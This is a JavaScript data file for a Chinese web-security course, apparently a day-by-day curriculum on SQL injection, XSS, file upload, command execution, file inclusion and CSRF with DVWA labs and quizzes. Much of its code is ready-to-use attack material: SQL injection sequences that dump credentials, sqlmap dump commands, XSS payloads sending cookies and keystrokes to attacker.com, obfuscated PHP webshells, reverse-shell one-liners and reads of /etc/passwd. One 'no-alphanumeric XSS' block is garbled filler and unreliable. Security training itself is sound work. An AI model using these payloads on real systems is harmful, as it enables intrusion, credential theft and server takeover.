days[16].keyPoints = ['知识回顾', '入门测试', '进阶准备'];

days[17].title = '基础篇总览';
days[17].subtitle = 'Basic Level Overview';
days[17].objectives = ['了解基础篇内容', '建立学习目标', '准备DVWA靶场'];
days[17].content = `基础篇带你深入学习三大核心Web漏洞：SQL注入、XSS、文件上传。

【基础篇内容】
• Day18-21：SQL注入（基础、进阶、高级、总结）
• Day22-25：XSS跨站脚本（基础、进阶、高级、总结）
• Day26-28：文件上传（基础、进阶、高级）
• Day29：基础篇总复习

【学习目标】
• 掌握SQL注入原理和利用方法
• 掌握XSS原理和利用方法
• 掌握文件上传漏洞原理和利用方法
• 能在DVWA上独立完成漏洞练习

【学习建议】
• 先理解原理，再动手实践
• 在DVWA上反复练习
• 记录学习笔记

基础篇是Web安全的核心，一定要学好！`;
days[17].keyPoints = ['基础篇内容', '学习目标', '学习建议'];

days[18].title = 'SQL注入基础';
days[18].subtitle = 'SQL Injection Basics';
days[18].objectives = ['理解SQL注入原理', '掌握SQL基础语法', '学会手工注入'];
days[18].content = `SQL注入是Web安全中最经典、最危险的漏洞之一。

【SQL基础语法】
• SELECT：查询数据
• INSERT：插入数据
• UPDATE：更新数据
• DELETE：删除数据
• 常用函数：version()、database()、user()

【SQL注入原理】
• 用户输入的数据被当成SQL代码执行
• 本质：代码和数据没有分离
• 条件：参数可控 + 带入数据库查询

【SQL注入分类】
• 按位置：GET、POST、Cookie、HTTP头
• 按类型：数字型、字符型
• 按结果：显注（有回显）、盲注（无回显）

【手工注入步骤】
1. 判断注入点（单引号测试、and 1=1/1=2）
2. 判断字段数（ORDER BY）
3. 判断显示位（UNION SELECT）
4. 收集信息（version、database）
5. 脱库（库→表→列→数据）

【实战练习】
在DVWA的SQL Injection模块中练习：
• 判断注入点
• 猜列数
• 找显示位
• 脱库

SQL注入是Web安全的必修课！`;
days[18].keyPoints = ['SQL基础', '注入原理', '分类方法', '手工注入步骤'];
days[18].codeExamples = [{ title: 'SQL注入手工利用', language: 'sql', code: '-- 1. 判断注入点\n?id=1\'\n?id=1 AND 1=1\n?id=1 AND 1=2\n\n-- 2. 判断字段数\n?id=1 ORDER BY 1--\n?id=1 ORDER BY 2--\n?id=1 ORDER BY 3--\n\n-- 3. 判断显示位\n?id=1 UNION SELECT 1,2,3--\n\n-- 4. 收集信息\n?id=1 UNION SELECT 1,version(),database()--\n\n-- 5. 查询所有数据库\n?id=1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--\n\n-- 6. 查询表名\n?id=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--\n\n-- 7. 查询列名\n?id=1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=\'users\'--\n\n-- 8. 查询数据\n?id=1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--', explanation: 'SQL注入手工利用完整流程' }];
days[18].labEnvironment = [{ name: 'DVWA SQL注入练习', description: '在DVWA上练习SQL注入', url: 'http://localhost:8081/vulnerabilities/sqli/', type: 'docker', setup: '1. 打开DVWA，难度选Low\n2. 进入SQL Injection模块\n3. 按步骤练习：判断注入点→猜列数→找显示位→脱库', expectedOutput: '成功获取数据库中的用户名和密码' }];
days[18].resources = [
  { name: 'SQL注入视频教程', url: 'https://www.bilibili.com/video/BV1Bt411o7cE', type: 'video' },
  { name: 'SQL注入详解', url: 'https://www.freebuf.com/articles/web/289012.html', type: 'article' },
];
days[18].quiz = [
  { type: 'single', question: 'SQL注入产生的根本原因是什么？', options: ['A. 数据库有漏洞', 'B. 用户输入的数据被当成SQL代码执行', 'C. 网站用了PHP', 'D. 服务器不安全'], correctIndex: 1, explanation: 'SQL注入的本质是用户输入的数据被当成SQL代码执行。' },
  { type: 'single', question: '判断查询结果有几列常用什么方法？', options: ['A. GROUP BY', 'B. ORDER BY', 'C. UNION', 'D. HAVING'], correctIndex: 1, explanation: '使用ORDER BY n来判断，如果n大于实际列数会报错。' },
  { type: 'fill', question: 'MySQL中，用来查询所有数据库名的表是______。', correctAnswer: 'information_schema.schemata', explanation: 'information_schema.schemata存储所有数据库名。' },
];
days[18].expertNotes = [
  { author: '余弦', title: 'SQL注入学习建议', content: '新手一定要先练手工注入，把原理搞懂，再去用工具。工具只是提高效率的，原理才是根本。', url: 'https://nmap.org/' },
];

days[19].title = 'SQL注入进阶';
days[19].subtitle = 'SQL Injection Advanced';
days[19].objectives = ['掌握报错注入', '学会盲注技术', '了解堆叠注入'];
days[19].content = `SQL注入进阶：当联合查询用不了的时候怎么办？

【报错注入】
• 原理：构造特殊SQL语句，让数据库报错并显示数据
• 常用函数：extractvalue()、updatexml()
• 适用场景：有报错信息但无回显

【盲注】
• 布尔盲注：通过页面真假判断数据
• 时间盲注：通过延迟判断数据
• 适用场景：无回显、无报错

【堆叠注入】
• 原理：多条SQL语句一起执行
• 分隔符：;
• 适用场景：数据库支持多语句执行

【宽字节注入】
• 原理：利用编码漏洞绕过转义
• 适用场景：PHP+MySQL，使用GBK编码

【实战技巧】
• 灵活运用各种注入方法
• 根据实际情况选择最合适的注入方式
• 注意编码问题

SQL注入技术博大精深，需要不断练习！`;
days[19].keyPoints = ['报错注入', '盲注技术', '堆叠注入', '宽字节注入'];
days[19].codeExamples = [{ title: '报错注入', language: 'sql', code: '-- extractvalue报错注入\n?id=1 AND extractvalue(1, concat(0x7e, database(), 0x7e))--\n\n-- updatexml报错注入\n?id=1 AND updatexml(1, concat(0x7e, database(), 0x7e), 1)--\n\n-- 查询表名\n?id=1 AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e))--\n\n-- 查询列名\n?id=1 AND extractvalue(1, concat(0x7e, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=\'users\'), 0x7e))--', explanation: '报错注入常用方法' }, { title: '时间盲注', language: 'sql', code: '-- 判断数据库名长度\n?id=1 AND if(length(database())>5, sleep(5), 1)--\n\n-- 逐字符猜数据库名\n?id=1 AND if(ascii(substring(database(),1,1))>100, sleep(5), 1)--\n\n-- 猜表名\n?id=1 AND if(ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100, sleep(5), 1)--', explanation: '时间盲注原理和示例' }];
days[19].resources = [
  { name: 'SQL注入进阶教程', url: 'https://www.bilibili.com/video/BV1sb411i7cF', type: 'video' },
];

days[20].title = 'SQL注入高级';
days[20].subtitle = 'SQL Injection Advanced';
days[20].objectives = ['掌握SQLMap工具', '学会绕过WAF', '了解二次注入'];
days[20].content = `SQL注入高级：自动化工具和绕过技巧。

【SQLMap工具】
• 自动化SQL注入工具
• 支持多种注入方式
• 自动脱库
• 支持绕过WAF

【SQLMap常用命令】
• 检测注入：sqlmap -u "http://target.com?id=1"
• 列数据库：sqlmap -u "http://target.com?id=1" --dbs
• 列数据表：sqlmap -u "http://target.com?id=1" -D dvwa --tables
• 列数据列：sqlmap -u "http://target.com?id=1" -D dvwa -T users --columns
• 导出数据：sqlmap -u "http://target.com?id=1" -D dvwa -T users -C username,password --dump

【WAF绕过技巧】
• 编码绕过：URL编码、Unicode编码
• 注释绕过：/**/、#、--
• 参数污染：id=1&id=2
• HTTP方法绕过：GET→POST→PUT
• 代理绕过：使用代理IP

【二次注入】
• 原理：先注入数据到数据库，再取出来时触发
• 场景：用户名注册、资料修改
• 特点：隐蔽性强

SQL注入是Web安全的永恒话题！`;
days[20].keyPoints = ['SQLMap工具', 'WAF绕过', '二次注入'];
days[20].codeExamples = [{ title: 'SQLMap常用命令', language: 'bash', code: '# 检测注入\nsqlmap -u "http://target.com/vulnerabilities/sqli/?id=1"\n\n# 列数据库\nsqlmap -u "http://target.com/?id=1" --dbs\n\n# 列数据表\nsqlmap -u "http://target.com/?id=1" -D dvwa --tables\n\n# 列数据列\nsqlmap -u "http://target.com/?id=1" -D dvwa -T users --columns\n\n# 导出数据\nsqlmap -u "http://target.com/?id=1" -D dvwa -T users -C username,password --dump\n\n# 绕过WAF\nsqlmap -u "http://target.com/?id=1" --tamper=space2comment\n\n# 批量扫描\nsqlmap -m urls.txt', explanation: 'SQLMap常用命令和技巧' }];
days[20].resources = [
  { name: 'SQLMap官方文档', url: 'https://sqlmap.org/', type: 'article' },
];

days[21].title = 'SQL注入模块总结';
days[21].subtitle = 'SQL Injection Module Summary';
days[21].objectives = ['回顾SQL注入知识', '完成模块测试', '准备XSS学习'];
days[21].content = `SQL注入模块学习结束，检验学习成果。

【SQL注入知识点回顾】
• SQL基础语法
• SQL注入原理
• 手工注入步骤
• 报错注入、盲注、堆叠注入
• SQLMap工具使用
• WAF绕过技巧

【模块测试】
1. SQL注入产生的条件是什么？
2. 手工注入的基本步骤是什么？
3. 报错注入的原理是什么？
4. 盲注有哪几种？各自的原理是什么？
5. SQLMap常用参数有哪些？

【实操练习】
• 在DVWA上完成SQL注入练习（Low/Medium/High难度）
• 使用SQLMap自动化脱库

SQL注入是Web安全最重要的漏洞，一定要掌握！`;
days[21].keyPoints = ['知识回顾', '模块测试', '实操练习'];

days[22].title = 'XSS基础';
days[22].subtitle = 'XSS Basics';
days[22].objectives = ['理解XSS原理', '掌握XSS分类', '学会存储型XSS'];
days[22].content = `XSS（跨站脚本攻击）是最常见的Web漏洞之一。

【XSS原理】
• 用户输入的脚本被浏览器执行
• 本质：数据和代码没有分离
• 危害：窃取Cookie、钓鱼、恶意跳转

【XSS分类】
• 存储型XSS：脚本存储在服务器，永久生效
• 反射型XSS：脚本通过URL参数传递，一次性生效
• DOM型XSS：脚本通过JavaScript操作DOM触发

【存储型XSS实战】
• 场景：留言板、评论区、用户资料
• 步骤：输入恶意脚本→服务器存储→其他用户查看时执行

【XSS Payload示例】
• 弹窗：<script>alert('XSS')</script>
• 窃取Cookie：<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
• 钓鱼：<iframe src="http://attacker.com/fake_login"></iframe>

【防御措施】
• 输入过滤：过滤特殊字符
• 输出编码：HTML编码、JS编码
• 设置HttpOnly Cookie

XSS虽然常见，但危害不容小觑！`;
days[22].keyPoints = ['XSS原理', '分类方法', '存储型XSS', 'Payload示例'];
days[22].codeExamples = [{ title: 'XSS Payload示例', language: 'javascript', code: '// 基础弹窗\n<script>alert(\"XSS\")</script>\n\n// 窃取Cookie\n<script>document.location=\"http://attacker.com/steal?cookie=\"+document.cookie</script>\n\n// 持久化Cookie窃取\n<script>\nvar img = new Image();\nimg.src = \"http://attacker.com/log?c=\" + encodeURIComponent(document.cookie);\n</script>\n\n// 钓鱼攻击\n<iframe src=\"http://attacker.com/fake_login\" width=\"100%\" height=\"600\"></iframe>\n\n// 键盘记录\n<script>\ndocument.onkeydown = function(e) {\n    var key = e.key;\n    new Image().src = \"http://attacker.com/log?key=\" + key;\n}\n</script>', explanation: 'XSS常用Payload' }];
days[22].resources = [
  { name: 'XSS视频教程', url: 'https://www.bilibili.com/video/BV17t411o7cE', type: 'video' },
];

days[23].title = 'XSS进阶';
days[23].subtitle = 'XSS Advanced';
days[23].objectives = ['掌握反射型XSS', '学会DOM型XSS', '了解XSS绕过技巧'];
days[23].content = `XSS进阶：反射型和DOM型XSS。

【反射型XSS】
• 原理：脚本通过URL参数传递，服务器反射回页面
• 场景：搜索框、错误页面、URL参数显示
• 特点：一次性，需要诱骗用户点击

【DOM型XSS】
• 原理：JavaScript操作DOM时执行恶意代码
• 场景：前端渲染、URL参数处理、本地存储
• 特点：服务器不参与，纯前端漏洞

【XSS绕过技巧】
• 标签绕过：<svg/onload>、<img/src>、<iframe>
• 事件绕过：onload、onerror、onclick、onmouseover
• 编码绕过：HTML编码、URL编码、Unicode编码
• 字符替换绕过：双写、大小写混合

【XSS进阶Payload】
• 绕过过滤的Payload
• 无字母数字的XSS
• Flash XSS
• 浏览器插件XSS

XSS绕过需要不断尝试和积累！`;
days[23].keyPoints = ['反射型XSS', 'DOM型XSS', '绕过技巧'];
days[23].codeExamples = [{ title: 'XSS绕过技巧', language: 'html', code: '<!-- 标签绕过 -->\n<svg/onload=alert(1)>\n<img/src=x onerror=alert(1)>\n<iframe/onload=alert(1)>\n\n<!-- 事件绕过 -->\n<div onmouseover=alert(1)>Hover me</div>\n<input onfocus=alert(1) autofocus>\n\n<!-- 编码绕过 -->\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n<img src=x onerror=%61%6c%65%72%74(1)>\n\n<!-- 双写绕过 -->\n<scr<script>ipt>alert(1)</script>\n\n<!-- 大小写混合 -->\n<ScRiPt>alert(1)</ScRiPt>\n\n<!-- 无字母数字XSS -->\n<script>\n$=~[];$={___:$,$$$$:(![]+"")[$],__$:$,$_$_:(![]+"")[$],_$_:$$$[$],$_$$:(![]+"")[$],$$_$:($[$]+"")[$],_$$:(![]+"")[$],$$$_:(![]+"")[$],$__:($[$]+"")[$],$__$:($[$]+"")[$],$$__:($[$]+"")[$],$$_:($[$]+"")[$],$:(![]+"")[$],__:(![]+"")[$],$___:(![]+"")[$],$__$$:($[$]+"")[$],$$_$$:($[$]+"")[$],$$__$:($[$]+"")[$],$____:(![]+"")[$],$_$:(![]+"")[$],$__$:(![]+"")[$],$____$:(![]+"")[$],$___$:(![]+"")[$],$__$$:(![]+"")[$],$_$$$:(![]+"")[$],$_____:(![]+"")[$]};\n</script>', explanation: 'XSS绕过技巧和Payload' }];

days[24].title = 'XSS高级';
days[24].subtitle = 'XSS Advanced';
days[24].objectives = ['掌握XSS平台使用', '学会XSS钓鱼', '了解XSS蠕虫'];
days[24].content = `XSS高级：利用XSS进行高级攻击。

【XSS平台】
• 作用：管理XSS Payload，收集Cookie
• 功能：自动生成Payload、Cookie收集、在线管理
• 常用平台：XSS Platform、BeEF

【XSS钓鱼攻击】
• 原理：利用XSS在目标页面植入钓鱼界面
• 场景：登录页面、支付页面、个人中心
• 步骤：发现XSS漏洞→植入钓鱼脚本→收集账号密码

【XSS蠕虫】
• 原理：利用XSS自动传播
• 场景：社交网站、论坛、留言板
• 特点：传播速度快、影响范围广

【XSS防御】
• 输入验证：白名单过滤
• 输出编码：HTML转义、JS转义
• CSP：内容安全策略
• HttpOnly：Cookie安全

XSS是Web安全中最需要关注的漏洞之一！`;
days[24].keyPoints = ['XSS平台', '钓鱼攻击', 'XSS蠕虫', '防御措施'];

days[25].title = 'XSS模块总结';
days[25].subtitle = 'XSS Module Summary';
days[25].objectives = ['回顾XSS知识', '完成模块测试', '准备文件上传学习'];
days[25].content = `XSS模块学习结束，检验学习成果。

【XSS知识点回顾】
• XSS原理和分类
• 存储型、反射型、DOM型XSS
• XSS Payload编写
• XSS绕过技巧
• XSS平台使用
• XSS防御措施

【模块测试】
1. XSS分为哪几种类型？各自的特点是什么？
2. 存储型XSS和反射型XSS的区别是什么？
3. 列举3种XSS绕过技巧。
4. XSS的危害有哪些？
5. 如何防御XSS？

【实操练习】
• 在DVWA上完成XSS练习（Low/Medium/High难度）
• 在XSS Challenges靶场上练习

XSS是Web安全的基础漏洞，一定要掌握！`;
days[25].keyPoints = ['知识回顾', '模块测试', '实操练习'];

days[26].title = '文件上传基础';
days[26].subtitle = 'File Upload Basics';
days[26].objectives = ['理解文件上传漏洞原理', '掌握文件上传绕过方法', '学会WebShell使用'];
days[26].content = `文件上传漏洞是Web安全中最危险的漏洞之一。

【文件上传漏洞原理】
• 服务器未正确验证上传文件
• 攻击者上传恶意文件（WebShell）
• 访问恶意文件获取服务器权限

【文件上传绕过方法】
• 扩展名绕过：php→php5→phtml→.pht
• MIME类型绕过：修改Content-Type
• 路径截断：利用%00截断
• 文件内容检测绕过：图片马

【WebShell】
• 定义：可以执行命令的脚本文件
• 类型：PHP一句话、ASP一句话、JSP一句话
• 工具：中国菜刀、蚁剑、冰蝎

【PHP一句话木马】
• 最基础：<?php eval($_POST['cmd']); ?>
• 加密版：编码绕过检测
• 图片马：结合图片绕过检测

【实战步骤】
1. 找到文件上传入口
2. 绕过上传限制
3. 上传WebShell
4. 连接WebShell获取权限

文件上传漏洞是获取服务器权限的重要途径！`;
days[26].keyPoints = ['上传原理', '绕过方法', 'WebShell', '实战步骤'];
days[26].codeExamples = [{ title: 'PHP一句话木马', language: 'php', code: '<?php\n// 基础一句话木马\n@eval($_POST[\"cmd\"]);\n?>\n\n<?php\n// 加密一句话木马\n$a = base64_decode(\"ZXZhbCgkX1BPU1RbJ2NtZCddKQ==\");\n@eval($a);\n?>\n\n<?php\n// 图片马\n// 在图片末尾添加\n/*\n<?php @eval($_POST[\"cmd\"]); ?>\n*/\n?>', explanation: 'PHP一句话木马示例' }];
days[26].resources = [
  { name: '文件上传视频教程', url: 'https://www.bilibili.com/video/BV17t411o7cE', type: 'video' },
];
days[26].quiz = [
  { type: 'single', question: '文件上传漏洞的本质是什么？', options: ['A. 服务器未正确验证上传文件', 'B. 用户权限太大', 'C. 文件大小限制', 'D. 文件类型限制'], correctIndex: 0, explanation: '文件上传漏洞的本质是服务器未正确验证上传文件。' },
];
days[26].expertNotes = [
  { author: '安全研究员', title: '文件上传学习建议', content: '文件上传漏洞是获取服务器权限的重要途径，一定要掌握各种绕过方法。特别是图片马，实战中非常常用。', url: 'https://www.hackerone.com/' },
];

days[27].title = '文件上传进阶';
days[27].subtitle = 'File Upload Advanced';
days[27].objectives = ['掌握文件上传绕过技巧', '学会图片马制作', '了解.htaccess攻击'];
days[27].content = `文件上传进阶：绕过技巧和高级攻击方法。

【文件上传绕过技巧】
• 扩展名绕过：php→php5→phtml→.pht→php3→php4→phps→phpt
• MIME类型绕过：修改Content-Type为image/jpeg
• 路径截断：%00截断、0x00截断
• 文件内容检测绕过：图片头绕过、二次渲染绕过
• .user.ini攻击：通过.user.ini配置让非php文件被解析

【图片马制作】
• 方法1：copy /b image.jpg + shell.php webshell.jpg
• 方法2：使用exiftool注入
• 方法3：使用Steghide隐藏

【.htaccess攻击】
• 上传.htaccess文件
• 配置AddType application/x-httpd-php .jpg
• 将图片文件解析为PHP

【实战技巧】
• 先测试服务器解析规则
• 尝试各种扩展名
• 结合其他漏洞利用

文件上传是Web安全的重中之重！`;
days[27].keyPoints = ['绕过技巧', '图片马', '.htaccess', '实战技巧'];
days[27].codeExamples = [{ title: '图片马制作', language: 'bash', code: '# 方法1：copy命令\ncopy /b image.jpg + shell.php webshell.jpg\n\n# 方法2：Linux命令\ncat image.jpg shell.php > webshell.jpg\n\n# 方法3：exiftool注入\nexiftool -Comment=\'<?php @eval($_POST[\"cmd\"]); ?>\' image.jpg\n\n# .htaccess配置\n<FilesMatch "webshell.jpg">\n    SetHandler application/x-httpd-php\n</FilesMatch>', explanation: '图片马制作方法' }];

days[28].title = '文件上传高级';
days[28].subtitle = 'File Upload Advanced';
days[28].objectives = ['掌握文件上传漏洞挖掘', '学会代码审计', '了解最新绕过技术'];
days[28].content = `文件上传高级：漏洞挖掘和代码审计。

【代码审计要点】
• 检查文件类型验证逻辑
• 检查文件路径处理
• 检查文件重命名逻辑
• 检查文件内容检测

【常见漏洞代码】
• 只验证扩展名，不验证内容
• 使用黑名单验证，白名单更安全
• 文件路径可被控制
• 文件名可被控制

【绕过技术】
• 00截断绕过
• 路径穿越绕过
• 大小写绕过
• 双写绕过
• 特殊字符绕过

【防御措施】
• 使用白名单验证文件类型
• 验证文件内容（文件头、Magic Number）
• 使用随机文件名
• 将上传文件存储在非Web目录
• 设置合适的文件权限

文件上传漏洞的根本在于服务器验证不充分！`;
days[28].keyPoints = ['代码审计', '漏洞挖掘', '绕过技术', '防御措施'];

days[29].title = '基础篇总复习';
days[29].subtitle = 'Basic Level Review';
days[29].objectives = ['回顾基础篇知识', '完成综合测试', '准备进阶学习'];
days[29].content = `基础篇学习结束，全面复习三大核心漏洞。

【基础篇知识点回顾】
• SQL注入：原理、分类、手工注入、工具使用
• XSS：原理、分类、Payload、绕过技巧
• 文件上传：原理、绕过、WebShell、图片马

【综合测试】
1. 简述SQL注入的原理和分类
2. XSS分为哪几种类型？各自的特点是什么？
3. 文件上传漏洞的常见绕过方法有哪些？
4. 如何防御SQL注入、XSS、文件上传？

【实操练习】
• 在DVWA上完成所有漏洞练习（Low/Medium/High）
• 在Upload-Labs上练习文件上传绕过

基础篇是Web安全的基石，一定要牢固掌握！`;
days[29].keyPoints = ['知识回顾', '综合测试', '实操练习'];

days[30].title = '进阶篇总览';
days[30].subtitle = 'Advanced Level Overview';
days[30].objectives = ['了解进阶篇内容', '建立学习目标', '准备学习'];
days[30].content = `进阶篇带你深入学习命令执行、文件包含、CSRF、SSRF和逻辑漏洞。

【进阶篇内容】
• Day31-33：命令执行（基础、绕过、总结）
• Day34-36：文件包含（基础、进阶、总结）
• Day37-39：CSRF与SSRF（基础、进阶、总结）
• Day40-42：逻辑漏洞（基础、越权、其他）
• Day43：进阶篇总复习

【学习目标】
• 掌握命令执行漏洞原理和利用方法
• 掌握文件包含漏洞原理和利用方法
• 掌握CSRF和SSRF原理和利用方法
• 理解逻辑漏洞的概念和类型

【学习建议】
• 理解原理是关键
• 多动手实践
• 记录学习笔记

进阶篇内容更深入，需要更多思考！`;
days[30].keyPoints = ['进阶篇内容', '学习目标', '学习建议'];

days[31].title = '命令执行基础';
days[31].subtitle = 'Command Execution Basics';
days[31].objectives = ['理解命令执行原理', '掌握命令注入方法', '学会常见命令'];
days[31].content = `命令执行漏洞是Web安全中最危险的漏洞之一。

【命令执行原理】
• 用户输入的命令被系统执行
• 本质：输入验证不充分
• 危害：获取服务器权限、控制服务器

【命令执行分类】
• 系统命令执行：执行系统命令（Linux/Windows）
• 代码执行：执行代码（PHP/Java/Python）

【命令注入方法】
• 管道符：|、||、&&
• 分号：;
• 反引号：\`\`
• \${}：命令替换

【常用命令】
• Linux：ls、cat、whoami、ifconfig、ps
• Windows：dir、type、whoami、ipconfig、tasklist

【实战步骤】
1. 找到命令执行入口
2. 测试命令注入
3. 获取Shell
4. 权限提升

命令执行漏洞能让你直接控制服务器！`;
days[31].keyPoints = ['命令执行原理', '注入方法', '常用命令', '实战步骤'];
days[31].codeExamples = [{ title: '命令注入测试', language: 'bash', code: '# 测试命令注入\n?cmd=whoami\n?cmd=id\n?cmd=ls+-la\n\n# 使用管道符\n?cmd=ls|whoami\n?cmd=ls;whoami\n?cmd=ls&&whoami\n?cmd=ls||whoami\n\n# 使用反引号\n?cmd=\`whoami\`\n\n# Windows命令\n?cmd=dir\n?cmd=whoami\n?cmd=ipconfig', explanation: '命令注入测试方法' }];

days[32].title = '命令执行绕过';
days[32].subtitle = 'Command Execution Bypass';
days[32].objectives = ['掌握命令执行绕过技巧', '学会绕过WAF', '了解无回显命令执行'];
days[32].content = `命令执行绕过：当命令被过滤时怎么办？

【命令过滤绕过】
• 空格过滤：\${IFS}、$IFS$9、<、<>
• 关键字过滤：大小写、双写、编码、注释
• 特殊字符过滤：使用不同的命令分隔符

【编码绕过】
• Base64编码：echo "d2hvYW1p" | base64 -d | bash
• URL编码：%68%6f%77%61%6d%69
• Unicode编码

【无回显命令执行】
• 反弹Shell：bash -i >& /dev/tcp/attacker/4444 0>&1
• DNS外带数据：dig +short @ns1.dnslog.cn whoami.dnslog.cn
• 文件写入：命令结果写入文件后读取

【WAF绕过】
• 使用编码
• 使用不同的命令格式
• 使用代理
• 使用混淆技术

命令执行绕过需要灵活运用各种技巧！`;
days[32].keyPoints = ['过滤绕过', '编码绕过', '无回显执行', 'WAF绕过'];
days[32].codeExamples = [{ title: '命令执行绕过技巧', language: 'bash', code: '# 空格绕过\n?id=1;cat${IFS}/etc/passwd\n?id=1;cat$IFS$9/etc/passwd\n?id=1;cat</etc/passwd\n\n# 关键字过滤绕过\n?id=1;CaT/etc/passwd\n?id=1;ca\\t/etc/passwd\n?id=1;c\'\'a\'\'t /etc/passwd\n\n# Base64编码绕过\n?id=1;echo \"Y2F0L2V0Yy9wYXNzd2Q=\"|base64 -d|bash\n\n# 反弹Shell\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nnc -e /bin/bash 10.0.0.1 4444\npython -c \"import socket;s=socket.socket();s.connect((\\\"10.0.0.1\\\",4444));import subprocess;p=subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\n\n# DNS外带数据\n?id=1;dig +short @ns1.dnslog.cn \`whoami\`.dnslog.cn', explanation: '命令执行绕过技巧' }];

days[33].title = '命令执行模块总结';
days[33].subtitle = 'Command Execution Module Summary';
days[33].objectives = ['回顾命令执行知识', '完成模块测试', '准备文件包含学习'];
days[33].content = `命令执行模块学习结束，检验学习成果。

【命令执行知识点回顾】
• 命令执行原理
• 命令注入方法
• 常用命令
• 绕过技巧
• 无回显执行
• 反弹Shell

【模块测试】
1. 命令执行漏洞的原理是什么？
2. 列举3种命令注入方法。
3. 命令执行的常见绕过方法有哪些？
4. 无回显命令执行如何获取结果？
5. 如何防御命令执行漏洞？

【实操练习】
• 在DVWA上练习命令执行
• 练习反弹Shell

命令执行漏洞是获取服务器权限的重要途径！`;
days[33].keyPoints = ['知识回顾', '模块测试', '实操练习'];

days[34].title = '文件包含基础';
days[34].subtitle = 'File Inclusion Basics';
days[34].objectives = ['理解文件包含原理', '掌握本地文件包含', '学会远程文件包含'];
days[34].content = `文件包含漏洞是Web安全中非常危险的漏洞。

【文件包含原理】
• 服务器包含了用户可控的文件路径
• 本质：输入验证不充分
• 危害：读取敏感文件、执行恶意代码

【文件包含分类】
• 本地文件包含（LFI）：包含本地文件
• 远程文件包含（RFI）：包含远程文件

【本地文件包含】
• 读取敏感文件：/etc/passwd、/etc/shadow、/etc/hosts
• 读取源代码：包含PHP文件获取源码
• 日志文件包含：包含Web日志、SSH日志

【远程文件包含】
• 包含远程服务器上的恶意文件
• 需要allow_url_include=On
• 上传恶意文件到远程服务器

【实战步骤】
1. 找到文件包含入口
2. 测试本地文件包含
3. 测试远程文件包含
4. 获取敏感信息或执行代码

文件包含漏洞能让你读取服务器上的任意文件！`;
days[34].keyPoints = ['文件包含原理', 'LFI', 'RFI', '实战步骤'];
days[34].codeExamples = [{ title: '文件包含测试', language: 'php', code: '// 本地文件包含\n?file=../../etc/passwd\n?file=../../../etc/passwd\n?file=/etc/passwd\n?file=../../../../var/log/apache2/access.log\n\n// 远程文件包含\n?file=http://attacker.com/shell.txt\n?file=http://attacker.com/shell.php\n\n// 伪协议\n?file=php://filter/read=convert.base64-encode/resource=index.php\n?file=php://input\n?file=data://text/plain,<?php%20system(\"whoami\");?>\n\n// 日志包含\n// 先访问: ?cmd=<?php system(\"whoami\"); ?>\n// 再包含日志: ?file=../../../../var/log/apache2/access.log', explanation: '文件包含测试方法' }];

days[35].title = '文件包含进阶';
days[35].subtitle = 'File Inclusion Advanced';
days[35].objectives = ['掌握文件包含绕过技巧', '学会日志包含', '了解伪协议利用'];
days[35].content = `文件包含进阶：绕过技巧和高级利用方法。

【文件包含绕过技巧】
• 路径遍历绕过：../、..\/、..\\、%2e%2e%2f
• 文件名截断：%00截断、路径长度截断
• 编码绕过：URL编码、双重编码
• 特殊字符绕过：使用各种编码方式

【日志包含攻击】
• 原理：将恶意代码写入日志文件，再包含日志文件执行
• 步骤：访问日志写入代码→包含日志文件→执行代码
• 适用场景：存在LFI但无法直接执行代码

【伪协议利用】
• php://filter：读取文件源码
• php://input：执行POST数据中的代码
• data://：执行数据中的代码
• zip://：读取压缩包中的文件

【实战技巧】
• 先测试服务器配置
• 尝试各种绕过方法
• 结合其他漏洞

文件包含漏洞的利用需要灵活思考！`;
days[35].keyPoints = ['绕过技巧', '日志包含', '伪协议', '实战技巧'];

days[36].title = '文件包含模块总结';
days[36].subtitle = 'File Inclusion Module Summary';
days[36].objectives = ['回顾文件包含知识', '完成模块测试', '准备CSRF学习'];
days[36].content = `文件包含模块学习结束，检验学习成果。

【文件包含知识点回顾】
• 文件包含原理
• LFI和RFI
• 敏感文件读取
• 日志包含攻击
• 伪协议利用
• 绕过技巧

【模块测试】
1. 文件包含漏洞的原理是什么？
2. LFI和RFI的区别是什么？
3. 如何利用日志包含执行代码？
4. PHP伪协议有哪些？各自的用途是什么？
5. 文件包含的常见绕过方法有哪些？

【实操练习】
• 在DVWA上练习文件包含
• 练习伪协议利用

文件包含漏洞是读取敏感信息的重要途径！`;
days[36].keyPoints = ['知识回顾', '模块测试', '实操练习'];

days[37].title = 'CSRF跨站请求伪造';
days[37].subtitle = 'CSRF Cross-Site Request Forgery';
days[37].objectives = ['理解CSRF原理', '掌握CSRF攻击方法', '学会防御措施'];
days[37].content = `CSRF（跨站请求伪造）是一种常见的Web攻击方式。

【CSRF原理】
• 利用用户已登录的状态发起请求
• 用户在不知情的情况下执行操作
• 本质：会话未验证请求来源

【CSRF攻击条件】
• 用户已登录目标网站
• 用户访问攻击者控制的页面
• 请求可以被伪造

【CSRF攻击方法】
• GET请求：使用img标签
• POST请求：使用form表单
• 自动提交：使用JavaScript自动提交

【CSRF防御措施】
• CSRF Token：每次请求携带随机Token
• 验证Referer：检查请求来源
• SameSite Cookie：限制Cookie发送
• 双重提交Cookie：将Cookie值作为参数提交

【实战示例】
• 修改用户密码
• 发起转账
• 删除用户数据

CSRF虽然危害不如XSS大，但也是重要的安全隐患！`;
days[37].keyPoints = ['CSRF原理', '攻击方法', '防御措施', '实战示例'];
